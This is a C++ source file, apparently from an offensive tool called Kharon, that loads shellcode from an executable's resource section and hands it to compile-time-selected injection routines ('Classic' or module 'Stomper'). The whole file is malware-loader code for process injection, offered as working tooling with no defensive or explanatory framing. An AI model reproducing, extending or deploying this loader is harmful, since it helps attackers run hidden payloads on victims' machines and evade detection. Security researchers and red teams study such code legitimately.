#include <Kharon.h>

auto Injection::Main(uint8_t * data, size_t size) -> VOID {
#if INJECTION_TECHNIQUE == INJECTION_TECHNIQUE_CLASSIC
    return Injection::Classic();
#elif INJECTION_TECHNIQUE == INJECTION_TECHNIQUE_STOMPER
    return Injection::Stomper(data, size);
#endif
}

#if SHELLCODE_SECTION_LOCATION == SHELLCODE_SECTION_RSRC

#ifndef RSRC_ID
#define RSRC_ID 101
#endif

namespace Shellcode {
    uint8_t* Data = nullptr;
    size_t   Size = 0;

    static BOOL Load() {
        DbgPrint("RSRC_ID: %d\n", RSRC_ID);

        HRSRC hRes = FindResourceW(NULL, MAKEINTRESOURCEW(RSRC_ID), MAKEINTRESOURCEW(10));
        if (!hRes) {
            DbgPrint("FindResourceW failed: (%d)\n", GetLastError());
            return FALSE;
        }

        HGLOBAL hLoad = LoadResource(NULL, hRes);
        if (!hLoad) {
            DbgPrint("LoadResource failed: (%d)\n", GetLastError());
            return FALSE;
        }

        Data = (uint8_t*)LockResource(hLoad);
        Size = (size_t)SizeofResource(NULL, hRes);

        DbgPrint("Shellcode loaded — Data: 0x%p Size: %llu\n", Data, Size);
        return Data != nullptr && Size > 0;
    }
}

auto EntryLoader( VOID ) -> VOID {
    if (!Shellcode::Load()) {
        DbgPrint("Failed to load shellcode from .rsrc\n");
        return;
    }
    Injection::Main(Shellcode::Data, Shellcode::Size);
}

#elif SHELLCODE_SECTION_LOCATION == SHELLCODE_SECTION_OTHER

auto EntryLoader( VOID ) -> VOID {
    Injection::Main(Shellcode::Data, Shellcode::Size);
}

#endif // SHELLCODE_SECTION
